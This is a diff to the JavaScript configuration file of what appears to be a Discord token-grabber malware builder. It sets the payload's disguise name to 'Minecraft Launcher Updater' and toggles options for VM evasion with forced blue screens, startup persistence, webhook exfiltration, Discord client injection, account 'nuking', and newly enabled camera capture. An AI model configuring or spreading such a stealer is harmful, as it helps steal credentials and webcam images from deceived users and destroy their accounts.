@@ -1,33 +1,5 @@
 /**
  * For configuration, see https://github.com/JustYuuto/Grabber/wiki/Configuration
- *
- * @type {{
- *   vmProtect: boolean,
- *   wifiNetworks: boolean,
- *   addToStartup: boolean,
- *   filename: string,
- *   webhook: {
- *     url: string,
- *     content: string
- *   },
- *   discord: {
- *     injectJs: boolean,
- *     uninstall: boolean,
- *     autoJoinGuild: boolean | string,
- *     killProcess: boolean,
- *     autoBuyNitro: boolean,
- *     nukeAccount: {
- *       removeAllFriends: boolean,
- *       sendMessageToAllDMs: boolean | string,
- *       leaveAllGuilds: boolean,
- *       deleteAllOwnedGuilds: boolean
- *     }
- *   },
- *   bsodIfVm: boolean,
- *   name: string,
- *   userAgent: string,
- *   fakeError: boolean
- * }}
  */
 module.exports = {
   name: 'Minecraft Launcher Updater',
@@ -42,6 +14,7 @@ module.exports = {
   bsodIfVm: true,
   fakeError: false,
   wifiNetworks: false,
+  camera: true,
   discord: {
     injectJs: false,
     autoBuyNitro: false,
